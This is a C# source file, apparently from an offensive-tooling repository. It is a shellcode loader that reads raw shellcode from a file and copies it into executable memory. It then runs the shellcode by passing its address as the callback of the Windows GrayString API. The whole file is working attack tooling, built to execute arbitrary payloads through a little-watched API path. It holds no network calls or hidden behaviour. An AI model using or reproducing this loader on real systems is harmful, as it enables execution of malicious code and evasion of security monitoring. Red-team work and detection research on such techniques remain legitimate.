// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GrayString
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: GrayString.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hDC = GetDC(IntPtr.Zero);
            GrayString(hDC, IntPtr.Zero, hAlloc, hAlloc, 0, 0, 0, 0, 0);
            ReleaseDC(IntPtr.Zero, hDC);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);


        [DllImport("User32.dll")]
        public extern static IntPtr GetDC(IntPtr hWnd);

        [DllImport("User32.dll")]
        public extern static bool GrayString(
            IntPtr hDC,
            IntPtr hBrush,
            IntPtr lpOutputFunc,
            IntPtr lpData,
            int nCount,
            int x,
            int y,
            int nWidth,
            int nHeigth);

        [DllImport("User32.dll")]
        public extern static IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
    }
}
